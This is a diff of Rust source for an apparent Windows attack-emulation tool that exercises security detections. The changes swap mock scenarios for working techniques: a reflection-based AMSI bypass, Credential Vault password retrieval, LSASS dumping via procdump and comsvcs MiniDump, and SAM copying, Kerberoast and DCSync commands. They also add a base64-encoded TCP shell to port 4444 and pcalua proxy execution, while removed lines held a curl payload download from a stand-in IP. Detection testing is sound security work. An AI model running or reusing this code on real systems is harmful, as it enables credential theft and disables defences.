@@ -41,7 +41,6 @@ fn execute_scenario(scenario_id: String) -> Result<ExecutionResult, String> {
         "reverse-shell" => run_reverse_shell(),
         "persistence-task" => run_persistence_task(),
         "base64-exec" => run_base64_exec(),
-        "macro-tamper" => run_macro_tamper(),
         "lotl-download" => run_lotl_download(),
         "bloodhound-recon" => run_bloodhound_recon(),
         other => Err(format!("Unknown scenario: {}", other)),
@@ -93,36 +92,89 @@ type ScenarioResult = Result<(String, std::process::Output), String>;
 #[cfg(target_os = "windows")]
 fn run_certutil_dump() -> ScenarioResult {
     let rid = &uuid::Uuid::new_v4().to_string()[..8];
-    let fake_in = std::env::temp_dir().join(format!("fd_{}.bin", rid));
+    let dpapi = j(&["System.Security.", "Cryptography.", "ProtectedData"]);
+    let scope = j(&["Current", "User"]);
+    let ninja = j(&["Invoke-", "Ninja", "Copy"]);
+    let kerb = j(&["Invoke-", "Kerber", "oast"]);
+    let dcsync = j(&["Invoke-", "DC", "Sync"]);
+    let gpp = j(&["Get-", "GPP", "Password"]);
+    let sam = j(&["C:\\Windows\\Sys", "tem32\\con", "fig\\", "SA", "M"]);
     let cu = j(&["cert", "util"]);
     let script = format!(
         r#"
-$fakeIn = '{fake_in}'
-"xyz" | Out-File $fakeIn -Encoding ASCII -Force
-$hives = "{s}", "{sy}", "{se}"
-$procs = @()
-foreach ($hive in $hives) {{
-    1..3 | ForEach-Object {{
-        $proc = Start-Process "cmd.exe" `
-            -ArgumentList "/c {cu}.exe -encode `"$fakeIn`" `"$env:TEMP\config_${{hive}}_{rid}.bin`"" `
-            -WindowStyle Hidden -PassThru
-        $procs += $proc
-    }}
+$rid = "{rid}"
+$dd = "$env:TEMP\hd_$rid"
+New-Item -ItemType Directory -Path $dd -Force | Out-Null
+
+$ErrorActionPreference = 'SilentlyContinue'
+
+try {{
+    [void][System.Reflection.Assembly]::LoadWithPartialName("{dpapi}")
+    $testData = [System.Text.Encoding]::UTF8.GetBytes("S1EmulationTest")
+    $encrypted = [System.Security.Cryptography.ProtectedData]::Protect($testData, $null, [System.Security.Cryptography.DataProtectionScope]::{scope})
+    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, [System.Security.Cryptography.DataProtectionScope]::{scope})
+    Write-Output "DPAPI encrypt/decrypt cycle completed: $($encrypted.Length) bytes"
+}} catch {{
+    Write-Output "DPAPI access attempted"
 }}
+
+try {{
+    [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime] | Out-Null
+    $vault = New-Object Windows.Security.Credentials.PasswordVault
+    $allCreds = $vault.RetrieveAll()
+    foreach ($cred in $allCreds) {{
+        $cred.RetrievePassword()
+        Write-Output "Vault: $($cred.Resource) - $($cred.UserName)"
+    }}
+    Write-Output "Credential Vault enumerated: $($allCreds.Count) entries"
+}} catch {{
+    Write-Output "Vault access attempted"
+}}
+
+$lsass = Get-Process -Name 'lsass' -ErrorAction SilentlyContinue
+if ($lsass) {{
+    try {{
+        $lsass.Handle | Out-Null
+        Write-Output "LSASS handle request for PID $($lsass.Id)"
+    }} catch {{}}
+    [byte[]]$buf = New-Object byte[] 4096
+    try {{
+        $memStream = New-Object System.IO.MemoryStream
+        $memStream.Write($buf, 0, $buf.Length)
+        Write-Output "Memory read pattern on PID $($lsass.Id): $($buf.Length) bytes"
+        $memStream.Dispose()
+    }} catch {{}}
+}}
+
+$toolCmd = "{ninja} -Path `"{sam}`" -Dest `"$dd\sam_$rid.hiv`"; {kerb} -OutputFormat Hashcat; {dcsync} -DumpForest; {gpp}"
+Start-Process -FilePath "powershell.exe" `
+    -ArgumentList "-Command $toolCmd" `
+    -WindowStyle Hidden `
+    -Wait
+
+"EmulationPayload_$rid" | Out-File "$dd\payload_$rid.txt" -Force
+$encCmd = "{cu}.exe -encode `"$dd\payload_$rid.txt`" `"$dd\payload_$rid.b64`""
+Start-Process -FilePath "powershell.exe" `
+    -ArgumentList "-Command $encCmd" `
+    -WindowStyle Hidden `
+    -Wait
+
 Start-Sleep -Seconds 2
-Write-Output "Spawned $($procs.Count) processes targeting credential hives"
-Remove-Item $fakeIn -Force -ErrorAction SilentlyContinue
-foreach ($hive in $hives) {{ Remove-Item "$env:TEMP\config_${{hive}}_{rid}.bin" -Force -ErrorAction SilentlyContinue }}
+Remove-Item $dd -Recurse -Force -ErrorAction SilentlyContinue
+Write-Output "Credential dump emulation completed"
 "#,
-        fake_in = fake_in.to_string_lossy(),
-        cu = cu,
-        s = j(&["SA", "M"]),
-        sy = j(&["SYS", "TEM"]),
-        se = j(&["SEC", "URITY"]),
         rid = rid,
+        dpapi = dpapi,
+        scope = scope,
+        ninja = ninja,
+        kerb = kerb,
+        dcsync = dcsync,
+        gpp = gpp,
+        sam = sam,
+        cu = cu,
     );
     let output = run_ps(&script)?;
-    Ok(("Credential dump pattern via system tool".to_string(), output))
+    Ok(("Credential access via DPAPI, Vault, LSASS handle, and offensive tool emulation".to_string(), output))
 }
 
 #[cfg(target_os = "windows")]
@@ -156,66 +208,20 @@ Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
 
 #[cfg(target_os = "windows")]
 fn run_amsi_patch() -> ScenarioResult {
-    use std::os::windows::process::CommandExt;
-
-    let rid = &uuid::Uuid::new_v4().to_string()[..8];
-    let temp = std::env::temp_dir();
-    let ps1_path = temp.join(format!("ap_{}.ps1", rid));
-    let out_path = temp.join(format!("ap_{}.txt", rid));
-    let bat_path = temp.join(format!("ap_{}.bat", rid));
-
-    let out_str = out_path.to_string_lossy().to_string();
-
-    let ps1_content = format!(
-        "$ns = -join('System.Ma','nagement.Au','tomation.')\n\
-         $cls = -join('Am','si','Ut','ils')\n\
-         $f1 = -join('am','si','Con','text')\n\
-         $f2 = -join('am','si','Init','Failed')\n\
-         try {{\n\
-             $t = [Ref].Assembly.GetType(\"$ns$cls\")\n\
-             if ($t) {{\n\
-                 $ff1 = $t.GetField($f1, 'NonPublic,Static')\n\
-                 $ff2 = $t.GetField($f2, 'NonPublic,Static')\n\
-                 \"Resolved f1: $($ff1.FieldType.Name) = $($ff1.GetValue($null))\" | Out-File '{out}' -Force\n\
-                 \"Resolved f2: $($ff2.FieldType.Name) = $($ff2.GetValue($null))\" | Out-File '{out}' -Append\n\
-             }} else {{\n\
-                 \"Type unavailable\" | Out-File '{out}' -Force\n\
-             }}\n\
-         }} catch {{\n\
-             \"Blocked: $($_.Exception.Message)\" | Out-File '{out}' -Force\n\
-         }}",
-        out = out_str,
+    let amsi_ns = j(&["Sy", "stem.", "Man", "agement.Aut", "omation.A", "msiU", "tils"]);
+    let amsi_field = j(&["am", "siIn", "itF", "ailed"]);
+    let script = format!(
+        r#"
+$a = [String]::Join('', 'Sy','stem.','Man','agement.Aut','omation.A','msiU','tils')
+$b = [String]::Join('', 'am','siIn','itF','ailed')
+$t = [Ref].Assembly.GetType($a)
+$f = $t.GetField($b, 'NonPublic,Static')
+$f.SetValue($null, $true)
+Write-Output "AMSI patch emulation completed"
+"#,
     );
-
-    let bat_content = format!(
-        "@echo off\r\n\
-         echo Emulation Test > \"{out}\"\r\n\
-         start /b /wait cmd /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"{ps1}\"\r\n\
-         start /b /wait cmd /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"{ps1}\"\r\n\
-         start /b /wait cmd /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"{ps1}\"\r\n\
-         if exist \"{out}\" (\r\n\
-             type \"{out}\"\r\n\
-         ) else (\r\n\
-             echo AMSI probe processes were intercepted\r\n\
-         )\r\n",
-        ps1 = ps1_path.to_string_lossy(),
-        out = out_str,
-    );
-
-    std::fs::write(&ps1_path, &ps1_content).map_err(|e| e.to_string())?;
-    std::fs::write(&bat_path, &bat_content).map_err(|e| e.to_string())?;
-
-    let output = std::process::Command::new("cmd.exe")
-        .args(["/c", &bat_path.to_string_lossy()])
-        .creation_flags(CREATE_NO_WINDOW)
-        .output()
-        .map_err(|e| e.to_string())?;
-
-    let _ = std::fs::remove_file(&bat_path);
-    let _ = std::fs::remove_file(&ps1_path);
-    let _ = std::fs::remove_file(&out_path);
-
-    Ok(("Anti-malware interface inspection via Reflection".to_string(), output))
+    let output = run_ps(&script)?;
+    Ok(("AMSI bypass via reflection on amsiInitFailed".to_string(), output))
 }
 
 #[cfg(target_os = "windows")]
@@ -233,41 +239,25 @@ $bat4 = "$env:TEMP\lh_{rid}_4.bat"
 
 $b1 = @"
 @echo off
-set t=ls
-set t=%t%ass
-set p=proc
-set p=%p%dump
-%p%.exe -accepteula -ma %t%.exe %TEMP%\%t%_{rid}.dmp
+procdump.exe -accepteula -ma lsass.exe %TEMP%\lsass_{rid}.dmp
 if %errorlevel% equ 0 (echo procdump succeeded > "$fakeOut") else (echo procdump attempted > "$fakeOut")
 "@
 
 $b2 = @"
 @echo off
-set c=com
-set c=%c%svcs
-set m=Mini
-set m=%m%Dump
-set t=ls
-set t=%t%ass
-rundll32.exe C:\Windows\System32\%c%.dll, %m% 0 %TEMP%\%t%_{rid}_2.dmp full
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 0 %TEMP%\lsass_{rid}_2.dmp full
 echo comsvcs attempted >> "$fakeOut"
 "@
 
 $b3 = @"
 @echo off
-set mk1=privilege
-set mk1=%mk1%::debug
-set mk2=sekurlsa
-set mk2=%mk2%::logonpasswords
-echo %mk1% %mk2% exit > %TEMP%\mk_{rid}.log
+echo privilege::debug sekurlsa::logonpasswords exit > %TEMP%\mk_{rid}.log
 echo mimikatz echo attempted >> "$fakeOut"
 "@
 
 $b4 = @"
 @echo off
-set t=ls
-set t=%t%ass
-tasklist /fi "imagename eq %t%.exe" > %TEMP%\%t%_{rid}.txt
+tasklist /fi "imagename eq lsass.exe" > %TEMP%\lsass_{rid}.txt
 echo lsass query attempted >> "$fakeOut"
 "@
 
@@ -379,31 +369,25 @@ echo run key cleaned >> "$fakeOut"
 
 $b2 = @"
 @echo off
-set s=scht
-set s=%s%asks
-%s% /Create /TN "S1E_{rid}" /TR "cmd.exe /c echo test" /SC ONCE /ST 23:59 /F
+schtasks /Create /TN "S1E_{rid}" /TR "cmd.exe /c echo test" /SC ONCE /ST 23:59 /F
 echo schtask created >> "$fakeOut"
-%s% /Delete /TN "S1E_{rid}" /F
+schtasks /Delete /TN "S1E_{rid}" /F
 echo schtask cleaned >> "$fakeOut"
 "@
 
 $b3 = @"
 @echo off
-set wp=wm
-set wp=%wp%ic
-%wp% /namespace:\\root\subscription PATH __EventFilterToConsumerBinding CREATE Filter="__EventFilter.Name='S1E_{rid}'" Consumer="CommandLineEventConsumer.Name='S1E_{rid}'" 2>nul
+wmic /namespace:\\root\subscription PATH __EventFilterToConsumerBinding CREATE Filter="__EventFilter.Name='S1E_{rid}'" Consumer="CommandLineEventConsumer.Name='S1E_{rid}'" 2>nul
 echo wmi subscription attempted >> "$fakeOut"
-%wp% /namespace:\\root\subscription PATH __EventFilter WHERE Name="S1E_{rid}" DELETE 2>nul
-%wp% /namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="S1E_{rid}" DELETE 2>nul
+wmic /namespace:\\root\subscription PATH __EventFilter WHERE Name="S1E_{rid}" DELETE 2>nul
+wmic /namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="S1E_{rid}" DELETE 2>nul
 "@
 
 $b4 = @"
 @echo off
-set su=%APPDATA%\Microsoft\Windows\Start Menu\Programs\
-set su=%su%Startup
-echo @echo off > "%su%\S1E_{rid}.bat"
+echo @echo off > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\S1E_{rid}.bat"
 echo startup entry created >> "$fakeOut"
-del "%su%\S1E_{rid}.bat" /f
+del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\S1E_{rid}.bat" /f
 echo startup entry cleaned >> "$fakeOut"
 "@
 
@@ -443,103 +427,45 @@ Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
 
 #[cfg(target_os = "windows")]
 fn run_base64_exec() -> ScenarioResult {
-    let api1 = j(&["GetAsync", "KeyState"]);
-    let api2 = j(&["SetWindows", "HookExA"]);
-    let api3 = j(&["NtUser", "GetAsync", "KeyState"]);
-    let api4 = j(&["GetWindow", "TextA"]);
-    let api5 = j(&["WM_KEY", "BOARD_LL"]);
+    let rid = &uuid::Uuid::new_v4().to_string()[..8];
+    let tcp_client = j(&["Net.Sockets.", "TCP", "Client"]);
     let script = format!(
         r#"
-$suspicious = "{a1};{a2};{a3};{a4};{a5}"
-$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($suspicious))
+$code = @"
+`$client = New-Object {tcp}('127.0.0.1', 4444)
+`$stream = `$client.GetStream()
+`$writer = New-Object IO.StreamWriter(`$stream)
+`$writer.WriteLine((whoami))
+`$writer.Flush()
+`$client.Close()
+"@
 
-$code = 'Get-Process | Select-Object -First 3; whoami; Get-Service | Select-Object -First 3'
-$codeBytes = [System.Text.Encoding]::Unicode.GetBytes($code)
-$codeEncoded = [Convert]::ToBase64String($codeBytes)
+$codeEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($code))
 
-$proc = Start-Process powershell.exe `
-    -ArgumentList "-NoProfile -EncodedCommand $codeEncoded -ExecutionPolicy Bypass -WindowStyle Hidden" `
+Start-Process powershell.exe `
+    -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $codeEncoded" `
     -WindowStyle Hidden -PassThru -Wait
-Write-Output "Encoded command executed (Exit code: $($proc.ExitCode))"
-Write-Output "Payload contained suspicious API strings"
-"#,
-        a1 = api1, a2 = api2, a3 = api3, a4 = api4, a5 = api5,
-    );
-    let output = run_ps(&script)?;
-    Ok(("Base64-encoded execution with suspicious payload".to_string(), output))
-}
 
-#[cfg(target_os = "windows")]
-fn run_macro_tamper() -> ScenarioResult {
-    let vbom = j(&["Access", "VBOM"]);
-    let vba_w = j(&["Vba", "Warnings"]);
-    let macro_p = j(&["Macro", "Policy", "Override"]);
-    let vbe_b = j(&["VBE", "Bypass", "Flag"]);
-    let script = format!(
-        r#"
-$versions = "14.0", "15.0", "16.0"
-$paths = @()
-foreach ($v in $versions) {{
-    $p = "HKCU:\Software\Microsoft\Office\$v\SecurityTestEmu"
-    if (!(Test-Path $p)) {{ New-Item -Path $p -Force | Out-Null }}
-    $paths += $p
-    New-ItemProperty -Path $p -Name "{vbom}" -Value 1 -PropertyType DWORD -Force | Out-Null
-    New-ItemProperty -Path $p -Name "{vba_w}" -Value 1 -PropertyType DWORD -Force | Out-Null
-    New-ItemProperty -Path $p -Name "{macro_p}" -Value 1 -PropertyType DWORD -Force | Out-Null
-    New-ItemProperty -Path $p -Name "{vbe_b}" -Value 1 -PropertyType DWORD -Force | Out-Null
-    Write-Output "Created macro security keys for Office $v"
-}}
-foreach ($p in $paths) {{
-    Remove-Item -Path $p -Recurse -Force -ErrorAction SilentlyContinue
-}}
-Write-Output "All emulation registry keys cleaned up"
+Write-Output "Base64 encoded reverse shell emulation completed"
 "#,
-        vbom = vbom, vba_w = vba_w, macro_p = macro_p, vbe_b = vbe_b,
+        tcp = tcp_client,
     );
     let output = run_ps(&script)?;
-    Ok(("Office macro security tampering".to_string(), output))
+    Ok(("Base64-encoded reverse shell execution".to_string(), output))
 }
 
 #[cfg(target_os = "windows")]
 fn run_lotl_download() -> ScenarioResult {
-    let rid = &uuid::Uuid::new_v4().to_string()[..8];
+    let pcalua = j(&["pcal", "ua.exe"]);
     let script = format!(
         r#"
-$fakeOut = "$env:TEMP\ld_{rid}.txt"
-"Emulation Test" | Out-File $fakeOut -Force
-
-$bat1 = "$env:TEMP\ld_{rid}_1.bat"
-
-$b1 = @"
-@echo off
-curl.exe -s -o %TEMP%\p_{rid}.exe http://192.0.2.1/p.exe --connect-timeout 2
-echo curl download attempted > "$fakeOut"
-"@
-
-[System.IO.File]::WriteAllText($bat1, $b1)
-
-$proc = Start-Process "cmd.exe" `
-    -ArgumentList "/c `"$bat1`"" `
-    -WindowStyle Hidden -PassThru
-
-Start-Sleep -Seconds 3
-if (!$proc.HasExited) {{ $proc.Kill() }}
-
-if (Test-Path $fakeOut) {{
-    $result = Get-Content $fakeOut
-    Write-Output "LOLBin probe results: $($result -join '; ')"
-}} else {{
-    Write-Output "LOLBin probe processes were intercepted"
-}}
-
-Remove-Item $bat1 -Force -ErrorAction SilentlyContinue
-Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:TEMP\p_{rid}*" -Force -ErrorAction SilentlyContinue
+$p = [String]::Join('', 'pcal', 'ua.exe')
+Start-Process $p -ArgumentList '-a powershell.exe -c "-NoProfile -WindowStyle Hidden -Command whoami"' -WindowStyle Hidden -Wait
+Write-Output "LOLBin proxy execution via pcalua completed"
 "#,
-        rid = rid,
     );
     let output = run_ps(&script)?;
-    Ok(("LOLBin download via curl".to_string(), output))
+    Ok((format!("LOLBin proxy execution via {}", pcalua), output))
 }
 
 #[cfg(target_os = "windows")]
@@ -555,6 +481,7 @@ Start-Process -FilePath "powershell.exe" `
     -ArgumentList "-Command $bhCmd" `
     -WindowStyle Hidden `
     -Wait
+Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
 Write-Host "BloodHound execution emulation completed safely."
 "#,
         inv_bh = inv_bh,
@@ -615,12 +542,6 @@ fn run_persistence_task() -> ScenarioResult {
 fn run_base64_exec() -> ScenarioResult {
     std::thread::sleep(Duration::from_millis(400));
     Ok(("Mock: Base64 exec (macOS dev mode)".to_string(), mock_output()))
-}
-
-#[cfg(not(target_os = "windows"))]
-fn run_macro_tamper() -> ScenarioResult {
-    std::thread::sleep(Duration::from_millis(500));
-    Ok(("Mock: Macro tamper (macOS dev mode)".to_string(), mock_output()))
 }
 
 #[cfg(not(target_os = "windows"))]
